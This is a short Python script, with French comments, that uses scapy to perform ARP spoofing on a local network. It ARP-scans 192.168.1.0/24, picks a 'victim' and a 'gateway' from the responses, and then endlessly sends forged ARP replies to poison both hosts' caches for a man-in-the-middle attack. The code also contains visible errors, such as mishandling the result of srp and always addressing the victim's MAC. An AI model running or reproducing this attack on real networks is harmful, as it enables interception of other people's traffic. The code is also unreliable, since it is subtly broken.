import scapy.all as scapy


def ARP_Spoof(IP):

    MAC = [] #Variable de stockage des adresses MAC
    IP = [] #Variable de stockage des adresses IP

    scapy.conf.verb = 0 
    ans= scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst = "192.168.1.0/24"), timeout = 2, inter = 0.1) # Scan ARP pour récupérer les adresses
    

    for i in range(len(ans)): # Stock des adresses MAC et IP
        MAC.append(ans[i][1].hwsrc)
        IP.append(ans[i][1].psrc)

    print("VICTIM : Adress Mac ",MAC[1],", IP  ",IP[1],"GATEWAY : Adress Mac ",MAC[2]," IP ",IP[2])
    
    def spoof(target_ip, spoof_ip): 
        packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = MAC[1], psrc = spoof_ip)
        scapy.send(packet, verbose = False)

    while True: # Redistribution des requêtes ARP 
            spoof(IP[1], IP[2])
            spoof(IP[2], IP[1])
